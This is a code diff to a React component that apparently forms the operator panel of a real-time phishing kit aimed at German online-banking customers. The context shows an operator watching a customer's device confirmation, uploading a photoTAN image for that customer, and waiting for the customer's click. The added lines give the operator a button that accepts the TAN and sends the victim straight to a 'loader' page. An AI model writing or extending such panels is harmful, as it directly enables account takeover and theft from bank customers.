@@ -208,6 +208,11 @@ const AuthLiveCard = () => {
                         Kunde sieht Gerätebestätigung mit Namen „{r.device_name || "iPhone"}". Wartet auf Klick auf photoTAN.
                       </p>
                       <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
+                      <div className="flex flex-wrap gap-2">
+                        <Button size="sm" variant="default" onClick={() => acceptTan(r)}>
+                          <CheckCircle2 className="h-4 w-4 mr-1" />Direkt zum Loader (Erfolg)
+                        </Button>
+                      </div>
                     </StepBlock>
                   )}
 
